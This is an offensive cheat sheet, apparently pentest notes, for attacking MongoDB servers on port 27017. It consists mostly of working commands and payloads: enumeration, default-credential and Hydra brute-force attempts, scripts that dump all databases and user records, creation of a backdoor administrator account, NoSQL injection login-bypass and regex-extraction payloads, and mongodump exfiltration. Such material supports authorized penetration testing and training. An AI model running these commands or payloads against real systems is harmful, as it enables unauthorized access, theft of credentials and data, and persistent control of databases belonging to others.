# Port 27017 - MongoDB

## Table of Contents
- [Enumeration](#enumeration)
- [Connect to MongoDB](#connect-to-mongodb)
- [Database Operations](#database-operations)
- [Authentication Bypass](#authentication-bypass)
- [Exploitation](#exploitation)
- [NoSQL Injection](#nosql-injection)

---

## Enumeration

### Quick Check (One-liner)

```shell
# Nmap all MongoDB scripts
nmap -p 27017 --script "mongodb-*" -sV $rhost

# Check anonymous access
mongosh "mongodb://$rhost:27017" --eval "db.adminCommand('listDatabases')" 2>/dev/null && echo "[+] No auth!"
```

### Using Docker (One-liner)

```shell
# Connect with Docker mongo client
docker run -it --rm mongo:3.6 mongo $rhost:27017 --eval "db.adminCommand('listDatabases')"
```

---

## Connect to MongoDB

### Using Docker (Recommended for older versions)

```shell
# Install Docker if needed
sudo apt install -y docker.io
sudo usermod -aG docker $USER
newgrp docker

# Connect using mongo:3.6 (supports older MongoDB servers)
docker run -it --rm mongo:3.6 mongo $rhost:27017

# With authentication
docker run -it --rm mongo:3.6 mongo $rhost:27017 -u $username -p $password
```

### Using mongosh (MongoDB Shell)

```shell
# Install
wget -qO - https://www.mongodb.org/static/pgp/server-6.0.asc | sudo apt-key add -
echo "deb [ arch=amd64 ] https://repo.mongodb.org/apt/ubuntu focal/mongodb-org/6.0 multiverse" | sudo tee /etc/apt/sources.list.d/mongodb-org-6.0.list
sudo apt update
sudo apt install -y mongodb-mongosh

# Connect
mongosh "mongodb://$rhost:27017"

# With auth
mongosh "mongodb://$username:$password@$rhost:27017"
```

### Using Legacy mongo Shell

```shell
# Install
sudo apt install -y mongodb-clients

# Connect without auth
mongo $rhost:27017

# With authentication
mongo $rhost:27017 -u $username -p $password --authenticationDatabase admin
```

---

## Database Operations

### Basic Commands

```javascript
// Show all databases
show dbs

// Use specific database
use $database

// Show collections (tables)
show collections

// Show all documents in collection
db.$collection.find()

// Pretty print
db.$collection.find().pretty()

// Find specific document
db.$collection.find({"username": "admin"})

// Count documents
db.$collection.count()

// Show database stats
db.stats()

// Show collection stats
db.$collection.stats()
```

### User Enumeration

```javascript
// Show users in current database
show users

// Show all users (admin db)
use admin
db.system.users.find().pretty()

// Show roles
show roles
```

### Data Extraction

```javascript
// Get all data from collection
db.$collection.find().forEach(printjson)

// Export specific fields
db.$collection.find({}, {"username": 1, "password": 1})

// Dump all collections
db.getCollectionNames().forEach(function(c) {
    print("=== " + c + " ===");
    db[c].find().forEach(printjson);
})
```

---

## Authentication Bypass

### Check for No Auth

```shell
# Connect without credentials
mongo $rhost:27017
# If successful, no auth required
```

### Common Default Credentials

| Username | Password |
|----------|----------|
| admin | admin |
| admin | password |
| root | root |
| mongodb | mongodb |

### Brute Force

```shell
# Using Hydra (limited support)
hydra -l admin -P /usr/share/wordlists/rockyou.txt $rhost mongodb

# Using Nmap
nmap --script "mongodb-brute" -p 27017 $rhost
```

---

## Exploitation

### Read Sensitive Data

```javascript
// Dump all databases
var dbs = db.adminCommand('listDatabases');
dbs.databases.forEach(function(d) {
    print("=== " + d.name + " ===");
    var currentDb = db.getSiblingDB(d.name);
    currentDb.getCollectionNames().forEach(function(c) {
        print("Collection: " + c);
        currentDb[c].find().forEach(printjson);
    });
})
```

### Mongo Express (Web UI) Exploitation

```shell
# Default port 8081
# Check for exposed Mongo Express
curl http://$rhost:8081

# Default credentials
admin:pass
```

### Create Admin User (if write access)

```javascript
use admin
db.createUser({
    user: "hacker",
    pwd: "hacked123",
    roles: [
        { role: "userAdminAnyDatabase", db: "admin" },
        { role: "readWriteAnyDatabase", db: "admin" }
    ]
})
```

---

## NoSQL Injection

### Authentication Bypass

```json
// Login bypass
{"username": {"$ne": ""}, "password": {"$ne": ""}}

// Or
{"username": "admin", "password": {"$ne": ""}}

// URL encoded
username=admin&password[$ne]=
```

### Data Extraction

```json
// Extract usernames starting with 'a'
{"username": {"$regex": "^a"}}

// Find password length
{"username": "admin", "password": {"$regex": ".{5}"}}
```

### Operators for Injection

| Operator | Description |
|----------|-------------|
| `$ne` | Not equal |
| `$gt` | Greater than |
| `$lt` | Less than |
| `$regex` | Regular expression |
| `$where` | JavaScript expression |
| `$or` | Logical OR |

### $where Injection (RCE potential)

```json
// Time-based detection
{"$where": "sleep(5000)"}

// Data exfiltration
{"$where": "this.username == 'admin' && this.password.match(/^a/)"}
```

---

## Tools

### NoSQLMap

```shell
# Install
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
pip install -r requirements.txt

# Run
python nosqlmap.py
```

### mongodump

```shell
# Dump all databases
mongodump --host $rhost --port 27017

# Dump specific database
mongodump --host $rhost --port 27017 -d $database

# With authentication
mongodump --host $rhost --port 27017 -u $username -p $password --authenticationDatabase admin
```

---

## Quick Reference

| Task | Command |
|------|---------|
| Connect | `mongo $rhost:27017` |
| Show databases | `show dbs` |
| Use database | `use dbname` |
| Show collections | `show collections` |
| Dump collection | `db.col.find().pretty()` |
| Show users | `show users` |

---

## Checklist

- [ ] Check if authentication required
- [ ] Enumerate databases and collections
- [ ] Look for sensitive data (users, passwords, tokens)
- [ ] Check for Mongo Express web interface
- [ ] Test NoSQL injection on web applications
- [ ] Try default credentials
- [ ] Check for write access
